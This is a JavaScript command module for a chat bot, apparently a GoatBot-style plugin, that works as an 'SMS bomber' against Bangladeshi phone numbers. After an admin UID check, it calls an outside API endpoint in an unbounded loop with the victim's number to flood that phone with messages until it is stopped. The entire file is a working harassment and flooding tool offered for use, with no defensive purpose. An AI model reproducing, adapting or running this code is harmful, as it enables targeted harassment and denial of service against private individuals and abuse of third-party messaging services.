const axios = require("axios");

// ✅ Add allowed admin UIDs here
const allowedUIDs = ["386542686904"]; // <-- Replace with your real UID

const bombingFlags = {};

module.exports = {
  config: {
    name: "sms",
    version: "2.0.0",
    author: "Maruf Hossain",
    countDown: 0,
    role: 0,
    shortDescription: "SMS bomber (admin only)",
    longDescription: "Only authorized users can start/stop SMS bombing using this command.",
    category: "tools",
    guide: {
      en: "{pn} 01XXXXXXXXX | {pn} off"
    }
  },

  onStart: async function ({ args, message, event }) {
    const threadID = event.threadID;
    const senderID = event.senderID;
    const number = args[0];

    // ✅ Check if sender is allowed
    if (!allowedUIDs.includes(senderID)) {
      return message.reply("❌ You are not authorized to use this command.");
    }

    if (number === "off") {
      if (bombingFlags[threadID]) {
        bombingFlags[threadID] = false;
        return message.reply("✅ SMS bombing has been stopped.");
      } else {
        return message.reply("⚠️ No SMS bombing is currently running in this thread.");
      }
    }

    if (!/^01[0-9]{9}$/.test(number)) {
      return message.reply(
        `⚠️ Invalid number format.\nPlease use a Bangladeshi number like: 01XXXXXXXXX\n\nExample:\n/sms 01XXXXXXXXX\nTo stop: /sms off`
      );
    }

    if (bombingFlags[threadID]) {
      return message.reply("⚠️ SMS bombing is already active in this thread! Use /sms off to stop.");
    }

    message.reply(`💥 SMS bombing started for number: ${number}\nTo stop, use /sms off`);

    bombingFlags[threadID] = true;

    // Start bombing loop
    (async function startBombing() {
      while (bombingFlags[threadID]) {
        try {
          await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
        } catch (err) {
          message.reply(`❌ Error occurred: ${err.message}`);
          bombingFlags[threadID] = false;
          break;
        }
      }
    })();
  }
};